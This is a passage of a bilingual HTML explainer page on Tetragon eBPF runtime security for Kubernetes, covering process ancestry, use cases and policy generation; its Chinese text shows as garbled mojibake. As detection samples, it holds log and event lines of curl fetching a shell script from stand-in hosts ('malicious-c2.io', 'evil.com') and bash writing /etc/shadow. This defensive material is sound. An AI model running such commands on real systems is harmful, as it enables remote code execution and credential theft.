                                    <span lang="zh">å†…å­˜å ç”¨</span><span lang="en">Memory Footprint</span>
                                </div>
                                <div class="dash-value"
                                    style="color: var(--cisco-midnight); font-size: 1.8rem; font-weight: bold;"> ~120 MB
                                </div>
                                <div style="font-size: 0.7rem; color: #58585B; margin-top: 5px;">
                                    <span lang="zh">Agent å¹³å‡å†…å­˜å ç”¨</span><span lang="en">Average Agent Memory</span>
                                </div>
                            </div>
                            <div class="dash-widget"
                                style="background: #F8FAFC; border: 1px solid var(--cisco-platinum); padding: 20px; border-radius: 8px;">
                                <div class="dash-label" style="color: #888; font-size: 0.75rem; margin-bottom: 5px;">
                                    <span lang="zh">å»¶è¿ŸæŠ–åŠ¨</span><span lang="en">Latency Jitter</span>
                                </div>
                                <div class="dash-value"
                                    style="color: var(--cisco-blue); font-size: 1.8rem; font-weight: bold;"> 0.05 ms
                                </div>
                                <div style="font-size: 0.7rem; color: #58585B; margin-top: 5px;">
                                    <span lang="zh">Syscall ç³»ç»Ÿè°ƒç”¨é¢å¤–å»¶è¿Ÿ</span><span lang="en">Additional Syscall
                                        Latency</span>
                                </div>
                            </div>
                        </div>

                        <div class="data-source-footnote"
                            style="margin-top: 25px; font-size: 0.75rem; color: var(--cisco-slate); border-top: 1px solid var(--cisco-platinum); padding-top: 15px; font-style: italic; opacity: 0.8;">
                            <span lang="zh">æ•°æ®ä¾æ®ï¼šåŸºäº Isovalent å®˜æ–¹æ€§èƒ½ç™½çš®ä¹¦åŠæ€ç§‘ XDR å¤§è§„æ¨¡ç”Ÿäº§é›†ç¾¤å‹åŠ›æµ‹è¯•æŠ¥å‘Š. æµ‹è¯•ç¯å¢ƒï¼š1200+ Node K8s é›†ç¾¤ï¼Œå†…æ ¸ç‰ˆæœ¬
                                5.15+ã€‚</span><span lang="en">Data Source: Based on Isovalent official performance white
                                paper and Cisco XDR stress test reports. Test Environment: 1200+ Node K8s cluster,
                                Kernel 5.15+.</span>
                        </div>

                        <div class="expert-persp-box"
                            style="margin-top: 30px; background: #F0F7FA; color: var(--cisco-midnight); border-left: 5px solid var(--cisco-blue); border-radius: 8px; padding: 20px;">
                            <strong style="color: var(--cisco-blue); display: block; margin-bottom: 8px;">
                                <span lang="zh">SRE å»ºè®®ï¼š</span><span lang="en">SRE Suggestion:</span>
                            </strong>
                            <p style="font-size: 0.9rem; margin: 0; line-height: 1.6; color: var(--cisco-midnight);">
                                <span lang="zh">ç”±äº Tetragon æ‰€æœ‰çš„è¿‡æ»¤é€»è¾‘éƒ½å‘ç”Ÿåœ¨å†…æ ¸æ€ï¼Œåªæœ‰åŒ¹é…ç­–ç•¥çš„â€œé«˜ä»·å€¼ä¿¡å·â€æ‰ä¼šè·¨è¿‡å†…æ ¸è¾¹ç•Œè¿›å…¥ç”¨æˆ·æ€ï¼Œè¿™ä»ç‰©ç†å±‚é¢ä¿è¯äº†åœ¨é«˜å¹¶å‘ IO
                                    åœºæ™¯ä¸‹ç³»ç»Ÿä¾ç„¶ç¨³å¥ã€‚</span><span lang="en">Since all Tetragon filtering logic happens
                                    in-kernel, only "high-value signals" matching the policy cross the kernel boundary.
                                    This physically ensures system stability even in high-concurrency IO
                                    scenarios.</span>
                            </p>
                        </div>
                    </div>
                </div>
        </section>
        
<style>
    /* Ancestry Tree Styles */
    .ancestry-container {
        display: flex; flex-direction: column; align-items: flex-start;
        padding: 40px; background: #F8FAFC; border-radius: 12px;
        border: 1px dashed var(--cisco-platinum); position: relative;
    }
    .ancestry-node {
        display: flex; align-items: center; gap: 15px;
        background: white; padding: 12px 20px; border-radius: 8px;
        box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 30px;
        border: 1px solid var(--cisco-platinum); position: relative;
        min-width: 280px; z-index: 2;
    }
    .ancestry-node::after {
        content: ''; position: absolute; left: 35px; top: 100%;
        width: 2px; height: 30px; background: var(--cisco-blue);
    }
    .ancestry-node:last-child::after { display: none; }
    .ancestry-node.alert { border: 2px solid var(--cisco-red); background: #FFF5F5; }
    .ancestry-node.alert::after { background: var(--cisco-red); }
    .node-icon { 
        width: 32px; height: 32px; border-radius: 6px; 
        display: flex; align-items: center; justify-content: center;
        background: var(--cisco-midnight); color: white;
        font-weight: bold;
    }
    .node-info { flex: 1; }
    .node-name { font-weight: 700; font-size: 0.9rem; color: var(--cisco-midnight); }
    .node-meta { font-size: 0.75rem; color: var(--cisco-slate); }
    .node-tag { 
        font-size: 10px; padding: 2px 6px; border-radius: 4px; 
        background: var(--cisco-light-gray); margin-left: auto;
        text-transform: uppercase; font-weight: bold;
    }

    @media (max-width: 768px) {
        .ancestry-container { padding: 20px; }
        .ancestry-node { min-width: 100%; }
    }
</style>

<section id="ancestry-context" style="background: #FFFFFF; padding: 80px 0; border-bottom: 1px solid var(--cisco-platinum);">
    <div class="container">
        <div class="section-header" style="text-align: center; max-width: 850px; margin: 0 auto 60px;">
            <h2>
                <span lang="zh">æ·±åº¦ä¸Šä¸‹æ–‡ä¸è¿›ç¨‹æº¯æº</span><span lang="en">Deep Context and Process Ancestry</span>
            </h2>
            <p style="margin-top: 20px; font-size: 1.05rem; line-height: 1.6; color: var(--cisco-slate);">
                <span lang="zh">åœ¨å®‰å…¨å®¡è®¡ä¸­ï¼Œä»…çŸ¥é“â€œè°è¢«æ€äº†â€æ˜¯ä¸å¤Ÿçš„ï¼Œä½ å¿…é¡»çŸ¥é“å®ƒâ€œä»å“ªå„¿æ¥â€ã€‚Tetragon é€šè¿‡ eBPF ç»´æŠ¤äº†å†…æ ¸æ€çš„è¿›ç¨‹çŠ¶æ€è¡¨ï¼Œå³ä½¿ä¸­é—´çˆ¶è¿›ç¨‹å·²é€€å‡ºï¼Œä¾ç„¶èƒ½å®Œæ•´å›æº¯æ•´ä¸ªæ”»å‡»è·¯å¾„ã€‚</span><span lang="en">In security auditing, knowing "who was killed" is not enough; you must know "where they came from." Tetragon maintains an in-kernel process state table via eBPF, enabling a complete backtrack of the attack path even if intermediate parent processes have exited.</span>
            </p>
        </div>

        <div style="display: flex; flex-wrap: wrap; gap: 40px; align-items: center;">
            <div style="flex: 1; min-width: 320px;">
                <div class="ancestry-container">
                    <div class="ancestry-node">
                        <div class="node-icon">C</div>
                        <div class="node-info">
                            <div class="node-name">containerd-shim</div>
                            <div class="node-meta">PID: 1024</div>
                        </div>
                        <div class="node-tag"><span lang="zh">è¿è¡Œæ—¶</span><span lang="en">Runtime</span></div>
                    </div>
                    <div class="ancestry-node">
                        <div class="node-icon" style="background: var(--cisco-blue);">S</div>
                        <div class="node-info">
                            <div class="node-name">entrypoint.sh</div>
                            <div class="node-meta">PID: 1025</div>
                        </div>
                        <div class="node-tag"><span lang="zh">åˆå§‹åŒ–</span><span lang="en">Init</span></div>
                    </div>
                    <div class="ancestry-node">
                        <div class="node-icon" style="background: var(--cisco-orange);">J</div>
                        <div class="node-info">
                            <div class="node-name">java -jar app.jar</div>
                            <div class="node-meta">PID: 1080</div>
                        </div>
                        <div class="node-tag"><span lang="zh">åº”ç”¨</span><span lang="en">App</span></div>
                    </div>
                    <div class="ancestry-node alert">
                        <div class="node-icon" style="background: var(--cisco-red);">B</div>
                        <div class="node-info">
                            <div class="node-name">/bin/bash (Reverse Shell)</div>
                            <div class="node-meta">PID: 2550</div>
                        </div>
                        <div class="node-tag" style="background: var(--cisco-red); color: white;"><span lang="zh">å·²é˜»æ–­</span><span lang="en">Blocked</span></div>
                    </div>
                </div>
            </div>

            <div style="flex: 1; min-width: 320px;">
                <h3><span lang="zh">è§£å†³ä¼ ç»Ÿæ—¥å¿—ç¢ç‰‡åŒ–éš¾é¢˜</span><span lang="en">Solving the Challenge of Fragmented Traditional Logs</span></h3>
                <p style="font-size: 1.05rem; line-height: 1.6; color: var(--cisco-slate); margin-top: 15px;">
                    <span lang="zh">ä¼ ç»Ÿå·¥å…·ä¾èµ–è¿›ç¨‹äº‹ä»¶æµçš„æ‹¼æ¥ã€‚å¦‚æœä¸€ä¸ªä¸­é—´å±‚è„šæœ¬åœ¨æ”»å‡»å‘ç”Ÿå‰å°±é€€å‡ºï¼Œå®¡è®¡æ—¥å¿—ä¼šå¤±å»å…³è”ã€‚Tetragon åˆ©ç”¨ BPF Map ä¿è¯äº†è¯æ®é“¾çš„å®Œæ•´æ€§ä¸ä¸å¯ä¼ªé€ æ€§ã€‚</span><span lang="en">Traditional tools rely on the splicing of process event streams. If an intermediate script exits before the attack occurs, audit logs lose the connection. Tetragon utilizes BPF Maps to guarantee the integrity and non-forgeability of the chain of custody.</span>
                </p>
                
                <div class="highlight-box">
                    <strong><span lang="zh">Tetragon çš„ BPF çŠ¶æ€æœºä¼˜åŠ¿ï¼š</span><span lang="en">Advantages of Tetragon's BPF State Machine:</span></strong>
                    <ul style="font-size: 0.95rem; list-style: none; margin-top: 10px; line-height: 1.8;">
                        <li style="margin-bottom: 8px;">âœ… <b><span lang="zh">å†…æ ¸æ€æŒä¹…åŒ–ï¼š</span><span lang="en">In-Kernel Persistence:</span></b> <span lang="zh">è¿›ç¨‹ä¿¡æ¯ä¸å—é€€å‡ºçš„å½±å“ã€‚</span><span lang="en">Process information is unaffected by process termination.</span></li>
                        <li style="margin-bottom: 8px;">âœ… <b><span lang="zh">èº«ä»½è¯†åˆ«è”åŠ¨ï¼š</span><span lang="en">Identity Association:</span></b> <span lang="zh">è‡ªåŠ¨å…³è” K8s Pod æ ‡ç­¾ã€‚</span><span lang="en">Automatically correlates with K8s Pod labels.</span></li>
                        <li>âœ… <b><span lang="zh">ä¸å¯ä¼ªé€ ï¼š</span><span lang="en">Non-forgeability:</span></b> <span lang="zh">æ•°æ®æ¥æºäºå†…æ ¸ <code>task_struct</code> éå†ã€‚</span><span lang="en">Data is sourced directly from kernel <code>task_struct</code> traversal.</span></li>
                    </ul>
                </div>

                <div class="mechanism-card" style="border-left: 5px solid var(--cisco-blue); background: #fdfdfd; padding: 25px;">
                    <h4 style="margin-bottom: 15px; color: var(--cisco-blue);">
                        <span lang="zh">å†…æ ¸æ€è¿›ç¨‹çŠ¶æ€æœº (Process State Machine)</span><span lang="en">In-Kernel Process State Machine</span>
                    </h4>
                    <p style="font-size: 0.95rem; line-height: 1.6; color: var(--cisco-midnight); margin-bottom: 10px;">
                        <strong><span lang="zh">ä¸ºä»€ä¹ˆä¸åªæ˜¯è¿½è¸ª PIDï¼Ÿ</span><span lang="en">Why not just track PIDs?</span></strong>
                    </p>
                    <p style="font-size: 0.95rem; line-height: 1.6; color: var(--cisco-slate); margin-bottom: 15px;">
                        <span lang="zh">åœ¨é«˜å¹¶å‘ç¯å¢ƒä¸­ï¼ŒPID ä¼šè¢«è¿…é€Ÿå›æ”¶åˆ©ç”¨ï¼ˆPID Recyclingï¼‰ã€‚å¦‚æœå®‰å…¨å·¥å…·åªçœ‹ PIDï¼Œå°±ä¼šå‘ç”Ÿâ€œè¯¯æ€â€æˆ–â€œè¯æ®é”™ä½â€ã€‚</span><span lang="en">In high-concurrency environments, PIDs are recycled quickly (PID Recycling). If security tools only look at PIDs, "false positives" or "misaligned evidence" will occur.</span>
                    </p>
                    <ul style="font-size: 0.9rem; padding-left: 20px; color: var(--cisco-slate); line-height: 1.6;">
                        <li style="margin-bottom: 10px;">
                            <strong><span lang="zh">å”¯ä¸€èº«ä»½æ ‡è¯†ï¼š</span><span lang="en">Unique Identity:</span></strong> 
                            <span lang="zh">Tetragon é€šè¿‡æŒ‚è½½ <code>sched_process_fork</code>ï¼Œå°† PID ä¸è¿›ç¨‹åˆ›å»ºæ—¶é—´ï¼ˆStart Timeï¼‰å’Œ Cgroup ID ç»‘å®šï¼Œç”Ÿæˆå†…æ ¸çº§å…¨å±€å”¯ä¸€ IDã€‚</span><span lang="en">By hooking <code>sched_process_fork</code>, Tetragon binds the PID with the Start Time and Cgroup ID to generate a kernel-level globally unique ID.</span>
                        </li>
                        <li>
                            <strong><span lang="zh">çŠ¶æ€æŒä¹…åŒ–ï¼š</span><span lang="en">State Persistence:</span></strong> 
                            <span lang="zh">åˆ©ç”¨ eBPF Map ç»´æŠ¤ä¸€ä¸ªæ´»è·ƒè¿›ç¨‹è¡¨ã€‚å³ä½¿ä¸­é—´çˆ¶è¿›ç¨‹é€€å‡ºï¼Œè¯¥æ¡ç›®ä¾ç„¶ä¿ç•™å…¶ç¥–å…ˆå…³ç³»ï¼Œç›´åˆ°è¿›ç¨‹å½»åº• <code>exit</code>ã€‚</span><span lang="en">Utilizing eBPF Maps to maintain an active process table. Even if intermediate parents exit, the entry retains the ancestry until the process fully exits.</span>
                        </li>
                    </ul>
                </div>                    
            </div>
        </div>
    </div>
</section>
<style>
    .grid-scenarios { 
        display: grid; 
        grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
        gap: 24px; 
        margin-top: 40px;
    }

    .pipeline-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin: 40px 0;
        gap: 20px;
    }
    .pipeline-node {
        background: white;
        padding: 20px;
        border-radius: 12px;
        box-shadow: var(--shadow-card);
        flex: 1;
        text-align: center;
        border-bottom: 4px solid var(--cisco-blue);
    }

    /* YAML / JSON ä»£ç å—æ ·å¼ */
    .yaml-block {
        background: #1E1E1E; border-radius: var(--radius-md); padding: 24px;
        font-family: 'Consolas', monospace; font-size: 0.9rem; color: #D4D4D4;
        border-left: 4px solid var(--cisco-green); overflow-x: auto; white-space: pre; margin: 20px 0;
    }
    .yaml-key { color: #569CD6; font-weight: bold; }
    .yaml-val { color: #CE9178; }
    .yaml-action { color: #C586C0; font-weight: bold; }

    /* 2025 ç‰¹æ€§è§’æ ‡ */
    .card-new-badge {
        position: absolute; top: -10px; right: 20px; background: var(--cisco-orange);
        color: white; font-size: 0.65rem; font-weight: bold; padding: 2px 8px;
        border-radius: 10px; text-transform: uppercase; box-shadow: 0 4px 8px rgba(245, 128, 37, 0.3);
        z-index: 2;
    }

    @media (max-width: 768px) {
        .grid-scenarios, .pipeline-container { grid-template-columns: 1fr; flex-direction: column; }
    }
</style>

<section id="scenarios" style="background: #F9FAFB; padding: 80px 0;">
    <div class="container">
        <div class="section-header" style="text-align: center; max-width: 850px; margin: 0 auto 60px;">
            <h2 style="font-size: 2.25rem; margin-bottom: 16px; position: relative; display: inline-block;">
                <span lang="zh">åº”ç”¨åœºæ™¯ä¸é˜²å¾¡ä»·å€¼ (Value)</span><span lang="en">Application Scenarios & Defensive Value</span>
            </h2>
            <p style="margin-top: 20px; font-size: 1.05rem; line-height: 1.6; color: var(--cisco-slate);">
                <span lang="zh">å°†å®‰å…¨ç­–ç•¥ä¸‹æ²‰åˆ°å†…æ ¸ï¼Œæ„å»ºä¸å¯ç»•è¿‡çš„è¿è¡Œæ—¶é˜²å¾¡è¾¹ç•Œã€‚</span><span lang="en">Embedding security policies into the kernel to build unbypassable runtime defensive boundaries.</span>
            </p>
        </div>

        <div class="grid-scenarios">
            <div class="card" style="border-top: 4px solid var(--cisco-red); position: relative;">
                <strong><span lang="zh">æ·±åº¦é˜²å¾¡ (Security)</span><span lang="en">Defense in Depth</span></strong>
                <ul style="font-size: 0.85rem; list-style: none; margin-top:10px; line-height: 1.8;">
                    <li style="margin-bottom:8px;">â€¢ <b><span lang="zh">æ–‡ä»¶ç¯¡æ”¹ï¼š</span><span lang="en">File Tampering:</span></b> <span lang="zh">ç›‘æ§ <code>/etc/passwd</code>, <code>/etc/shadow</code> ç­‰æ•æ„Ÿé…ç½®æ–‡ä»¶çš„ <code>write</code> è¡Œä¸ºã€‚</span><span lang="en">Monitoring <code>write</code> behavior on sensitive configuration files like <code>/etc/passwd</code> and <code>/etc/shadow</code>.</span></li>
                    <li style="margin-bottom:8px;">â€¢ <b><span lang="zh">åå¼¹ Shellï¼š</span><span lang="en">Reverse Shell:</span></b> <span lang="zh">ç›‘æ§ <code>connect</code> è°ƒç”¨ï¼Œç¦æ­¢éç™½åå•åœ°å€çš„å¤–è¿ä¼å›¾ã€‚</span><span lang="en">Monitoring <code>connect</code> calls to prohibit outbound connection attempts to non-whitelisted addresses.</span></li>
                    <li>â€¢ <b><span lang="zh">å®¹å™¨é€ƒé€¸ï¼š</span><span lang="en">Container Escape:</span></b> <span lang="zh">æ£€æµ‹å¼‚å¸¸çš„ Namespace æŒ‚è½½è¡Œä¸ºï¼Œå¼ºåˆ¶æ‰§è¡Œè¾¹ç•Œéš”ç¦»ã€‚</span><span lang="en">Detecting abnormal Namespace mount behaviors to enforce boundary isolation.</span></li>
                </ul>
            </div>

            <div class="card" style="border-top: 4px solid var(--cisco-sky);">
                <strong><span lang="zh">å®‰å…¨åˆè§„ (Compliance)</span><span lang="en">Security Compliance</span></strong>
                <p style="font-size: 0.85rem; margin-top: 10px; line-height: 1.6;">
                    <span lang="zh">å®æ—¶æ£€æµ‹å®¹å™¨å†…æ‰§è¡Œ <code>curl</code>, <code>apt-get</code>, <code>wget</code> ç­‰è¿è§„è¿ç»´å‘½ä»¤ã€‚é€šè¿‡è¡Œä¸ºç™½åå•ç¡®ä¿ç”Ÿäº§ç¯å¢ƒçš„â€œä¸å¯å˜æ€§ï¼ˆImmutabilityï¼‰â€ï¼Œæ»¡è¶³ SOC2/PCI-DSS åˆè§„æ€§å®¡è®¡ã€‚</span><span lang="en">Real-time detection of unauthorized commands like <code>curl</code>, <code>apt-get</code>, and <code>wget</code> inside containers. Ensuring production "Immutability" via behavior whitelisting to satisfy SOC2/PCI-DSS compliance audits.</span>
                </p>
            </div>

            <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                <strong><span lang="zh">æ•…éšœæ’æŸ¥ & é›¶ä¿¡ä»»</span><span lang="en">Troubleshooting & Zero Trust</span></strong>
                <p style="font-size: 0.85rem; margin-top: 10px; line-height: 1.6;">
                    <span lang="zh">é€šè¿‡ç›‘æ§ TCP SYN é‡ä¼ å®šä½ç½‘ç»œå»¶è¿Ÿç“¶é¢ˆã€‚åŸºäº Kubernetes èº«ä»½æ‰§è¡Œâ€œæœ€å°æƒé™è®¿é—®â€ç­–ç•¥ï¼Œç¡®ä¿è¿›ç¨‹åªèƒ½è®¿é—®å£°æ˜çš„å¤–éƒ¨åŸŸåã€‚</span><span lang="en">Locating network latency bottlenecks via TCP SYN retransmission monitoring. Executing "Least Privilege Access" based on Kubernetes identity to ensure processes only access declared external domains.</span>
                </p>
            </div>

            <div class="card" style="border-top: 4px solid var(--cisco-midnight);">
                <strong><span lang="zh">å–è¯åˆ†æ (Forensics)</span><span lang="en">Forensic Analysis</span></strong>
                <p style="font-size: 0.85rem; margin-top: 10px; line-height: 1.6;">
                    <span lang="zh">å…¥ä¾µå‘ç”Ÿåï¼Œåˆ©ç”¨ Tetragon çš„æ·±åº¦ç¥–å…ˆè¿›ç¨‹æ ‘å›æº¯æ”»å‡»è€…çš„æ¨ªå‘ç§»åŠ¨è½¨è¿¹ã€æŒ‡ä»¤æ‰§è¡Œåºåˆ—åŠç¯å¢ƒå˜é‡æŒ‡çº¹ï¼Œæä¾›æ³•åº­çº§è¯æ®é“¾ã€‚</span><span lang="en">Post-intrusion, leveraging Tetragon's deep process ancestry tree to backtrack lateral movement, instruction execution sequences, and environment variable fingerprints, providing forensic-grade evidence chains.</span>
                </p>
            </div>

            <div class="card" style="border-top: 4px solid var(--cisco-orange); position: relative;">
                <div class="card-new-badge">New 2025</div>
                <strong><span lang="zh">2025: ä¾›åº”é“¾éªŒè¯</span><span lang="en">2025: Supply Chain Validation</span></strong>
                <p style="font-size: 0.85rem; margin-top: 10px; line-height: 1.6;">
                    <b>[<span lang="zh">æ–°å¢å¼º</span><span lang="en">Enhanced</span>]</b>
                    <span lang="zh">ä¸ SBOM (è½¯ä»¶ç‰©æ–™æ¸…å•) æ·±åº¦è”åŠ¨ã€‚ç¡®ä¿ Pod è¿è¡Œæ—¶çš„äºŒè¿›åˆ¶æ–‡ä»¶æŒ‡çº¹ä¸é•œåƒ SBOM è®°å½• 100% åŒ¹é…ï¼Œé¢„é˜²ä¾›åº”é“¾æŠ•æ¯’åˆ©ç”¨ã€‚</span><span lang="en">Deep linkage with SBOM (Software Bill of Materials). Ensuring Pod runtime binary fingerprints match image SBOM records 100% to prevent supply chain poisoning exploits.</span>
                </p>
            </div>
            <div class="card" style="border-top: 4px solid var(--cisco-sky); position: relative;">
                <div class="card-new-badge" style="background: var(--cisco-blue);">Advanced</div>
                <strong><span lang="zh">æ·±åº¦åè®®æ„ŸçŸ¥ (L7 Visibility)</span><span lang="en">L7 Protocol Visibility</span></strong>
                <p style="font-size: 0.85rem; margin-top: 10px; line-height: 1.6;">
                    <span lang="zh">åŸºäº Tetragon çš„è§£æå¼•æ“ï¼Œæ— éœ€ Sidecar å³å¯åœ¨å†…æ ¸å±‚æ„ŸçŸ¥ HTTP/DNS/TLS å…ƒæ•°æ®ã€‚è¿™ä½¿å¾—å®‰å…¨å›¢é˜Ÿå¯ä»¥è·¨è¶Šâ€œåŠ å¯†é»‘ç›’â€ï¼Œè¯†åˆ«å†…ç½‘ä¸­éšè—çš„æŒ‡ä»¤ä¼ è¾“æˆ–éæ³• C2 åŸŸåè®¿é—®ã€‚</span>
                    <span lang="en">Leveraging Tetragon's engine, achieve L7 visibility (HTTP/DNS/TLS) at the kernel level without sidecars. Identify hidden commands or illegal C2 domain access across encrypted tunnels.</span>
                </p>
            </div>
        </div>

        <div class="view-section" style="margin-top: 80px;">
            <div class="view-title">
                <span lang="zh">å®‰å…¨ç®¡é“é›†æˆ (Security Pipeline)</span><span lang="en">Security Pipeline Integration</span>
            </div>
            <p style="margin-bottom: 30px; font-size: 1.05rem; line-height: 1.6; color: var(--cisco-slate);">
                <span lang="zh">Tetragon ä¸ä»…ä»…æ˜¯ä¸€ä¸ªé˜»æ–­å·¥å…·ï¼Œæ›´æ˜¯ç°ä»£ SOC çš„æ ¸å¿ƒæ•°æ®æºã€‚å®ƒå°†å†…æ ¸åŸå§‹ä¿¡å·è½¬åŒ–ä¸ºç»“æ„åŒ–çš„ JSON äº‹ä»¶æµã€‚</span><span lang="en">Tetragon is not just an enforcement tool but a core data source for modern SOCs. It transforms raw kernel signals into structured JSON event streams.</span>
            </p>
            
            <div class="pipeline-container">
                <div class="pipeline-node">
                    <strong>Kernel Hook</strong>
                    <p style="font-size: 0.75rem; color: #666;">eBPF Signals</p>
                </div>
                <div style="font-weight:bold; color: var(--cisco-blue);">â†’</div>
                <div class="pipeline-node" style="border-color: var(--cisco-orange);">
                    <strong>Tetragon Agent</strong>
                    <p style="font-size: 0.75rem; color: #666;">Identity Enrichment</p>
                </div>
                <div style="font-weight:bold; color: var(--cisco-blue);">â†’</div>
                <div class="pipeline-node" style="border-color: var(--cisco-midnight);">
                    <strong>gRPC / JSON Export</strong>
                    <p style="font-size: 0.75rem; color: #666;">Structured Telemetry</p>
                </div>
                <div style="font-weight:bold; color: var(--cisco-blue);">â†’</div>
                <div class="pipeline-node" style="border-color: var(--cisco-sky);">
                    <strong>Splunk / Cisco XDR</strong>
                    <p style="font-size: 0.75rem; color: #666;">Alerting & Visualization</p>
                </div>
            </div>

            <div class="yaml-block" style="border-left-color: var(--cisco-blue);">
<span style="color: #6A9955;">// Typical Tetragon JSON Event Schema</span>
{
  <span class="yaml-key">"process_exec"</span>: {
    <span class="yaml-key">"process"</span>: { <span class="yaml-key">"pod"</span>: { <span class="yaml-key">"name"</span>: <span class="yaml-val">"payment-app-84f"</span>, <span class="yaml-key">"namespace"</span>: <span class="yaml-val">"prod"</span> }, <span class="yaml-key">"binary"</span>: <span class="yaml-val">"/usr/bin/curl"</span> },
    <span class="yaml-key">"arguments"</span>: <span class="yaml-val">"http://malicious-c2.io/shell.sh"</span>,
    <span class="yaml-key">"action"</span>: <span class="yaml-val">"KILLED"</span>
  }
}</div>
        </div>
    </div>
</section>

<style>
    .discovery-card {
        background: #FFFFFF; border: 1px solid var(--cisco-platinum);
        border-radius: 12px; padding: 0; overflow: hidden;
        display: grid; grid-template-columns: 1.2fr 1fr; gap: 0;
        box-shadow: var(--shadow-card); margin-bottom: 40px;
    }
    .log-side { background: #1A1F2B; padding: 25px; color: #ADBAC7; font-family: 'Courier New', monospace; font-size: 0.85rem; border-right: 1px solid #30363D; }
    .policy-side { background: #FFFFFF; padding: 25px; position: relative; }
    .log-line { margin-bottom: 10px; border-left: 2px solid #444; padding-left: 12px; opacity: 0.7; transition: all 0.3s; }
    .log-line.highlight { opacity: 1; border-left-color: var(--cisco-blue); background: rgba(4, 159, 217, 0.1); }
    .policy-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; }
    
    .yaml-transfer { animation: slide-up 0.5s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
    @keyframes slide-up {
        from { transform: translateY(20px); opacity: 0; }
        to { transform: translateY(0); opacity: 1; }
    }

    @media (max-width: 768px) {
        .discovery-card { grid-template-columns: 1fr; }
    }
</style>

<section id="policy-discovery" style="background: white; border-bottom: 1px solid var(--cisco-platinum);">
    <div class="container">
        <div class="section-header">
            <h2>
                <span lang="zh">ç­–ç•¥å‘ç°ï¼šä»è§‚æµ‹åˆ°é˜²å¾¡çš„è‡ªåŠ¨åŒ–è½¬åŒ–</span><span lang="en">Policy Discovery: Automated Transition from Observation to Defense</span>
            </h2>
            <p>
                <span lang="zh">å®‰å…¨ç­–ç•¥ä¸åº”é æ‰‹åŠ¨çŒœæµ‹ã€‚Tetragon å¯ä»¥é€šè¿‡è§‚æµ‹ä¸šåŠ¡åœ¨æµ‹è¯•ç¯å¢ƒçš„æ­£å¸¸è¡Œä¸ºï¼Œè‡ªåŠ¨å‘ç°å¹¶æç‚¼å®‰å…¨ç­–ç•¥ã€‚</span><span lang="en">Security policies should not rely on guesswork. Tetragon can automatically discover and refine security policies by observing normal workload behavior in test environments.</span>
            </p>
        </div>
        
        <div class="discovery-card">
            <div class="log-side" id="log-view">
                <div style="color: #6CC24A; margin-bottom: 15px; font-weight: bold;">[OBSERVABILITY LOG STREAM]</div>
                <div class="log-line">{"process": "java", "op": "exec", "target": "whoami"}</div>
                <div class="log-line highlight">{"process": "java", "op": "exec", "target": "curl", "args": ["evil.com"]}</div>
                <div class="log-line">{"process": "nginx", "op": "connect", "dest": "10.0.0.1"}</div>
                <div class="log-line highlight">{"process": "bash", "op": "write", "path": "/etc/shadow"}</div>
            </div>
            
            <div class="policy-side">
                <div class="policy-header">
                    <strong style="color: var(--cisco-midnight);">
                        <span lang="zh">TracingPolicy é¢„è§ˆ</span><span lang="en">TracingPolicy Preview</span>
                    </strong>
                    <span id="discovery-status" style="font-size: 0.75rem;">
                        <span lang="zh">å¾…ç”Ÿæˆ...</span><span lang="en">Pending...</span>
                    </span>
                </div>
                <div id="policy-container" style="height: 220px; border: 1px solid #E4E4E4; border-radius: 8px; padding: 15px; background: #FAFAFA; overflow: hidden;">
                    <div id="empty-policy-text" style="text-align: center; color: #999; padding-top: 80px;">
                        <span lang="zh">ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®æå–ç­–ç•¥</span><span lang="en">Click the button below to extract policy</span>
                    </div>
                    <div id="generated-yaml" style="display: none; font-family: monospace; font-size: 0.8rem; white-space: pre; color: #333;">
<span style="color: #005cc5;">apiVersion</span>: <span style="color: #032f62;">cilium.io/v1alpha1</span>
<span style="color: #005cc5;">kind</span>: <span style="color: #032f62;">TracingPolicy</span>
<span style="color: #005cc5;">spec</span>:
  <span style="color: #005cc5;">kprobes</span>:
  - <span style="color: #005cc5;">call</span>: <span style="color: #032f62;">"sys_execve"</span>
    <span style="color: #005cc5;">selectors</span>:
    - <span style="color: #005cc5;">matchBinaries</span>:
      - <span style="color: #005cc5;">values</span>: [<span style="color: #032f62;">"/usr/bin/curl"</span>]
      <span style="color: #005cc5;">matchActions</span>:
      - <span style="color: #005cc5;">action</span>: <span style="color: #d73a49;">Sigkill</span></div>
                </div>
                <div style="margin-top: 20px; text-align: center;">
                    <button class="btn-primary" id="discover-btn" onclick="startDiscovery()" style="background: var(--cisco-blue); color: white; border: none; padding: 12px 24px; border-radius: 20px; font-weight: 600; cursor: pointer;">
                        <span lang="zh">è½¬æ¢ä¸ºé˜²å¾¡ç­–ç•¥</span><span lang="en">Convert to Defense Policy</span>
                    </button>
                </div>
            </div>
        </div>

        <div class="view-section" style="margin-top: 40px;">
            <div class="view-title">
                <span lang="zh">è¿›é˜¶ç­–ç•¥ï¼šè”åŠ¨èº«ä»½ä¸æ·±åº¦å‚æ•°è¿‡æ»¤</span><span lang="en">Advanced Policies: Linking Identity and Deep Parameter Filtering</span>
            </div>
            <p>
                <span lang="zh">åœ¨å¤æ‚çš„ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ›´ç²¾å‡†çš„é˜²å¾¡. ä¾‹å¦‚ï¼šåªå…è®¸ç‰¹å®šçš„ Pod è®¿é—®ç‰¹å®šçš„æ–‡ä»¶è·¯å¾„ã€‚</span><span lang="en">In complex production environments, we need more precise defense. For example: allowing only specific Pods to access specific file paths.</span>
            </p>
            <div class="yaml-block" style="border-left-color: var(--cisco-midnight);"><span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"deep-defense-demo"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">podSelector</span>:
    <span class="yaml-key">matchLabels</span>:
      <span class="yaml-key">app</span>: <span class="yaml-val">"payment-gateway"</span>
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_openat"</span>
    <span class="yaml-key">syscall</span>: <span class="yaml-val">true</span>
    <span class="yaml-key">args</span>:
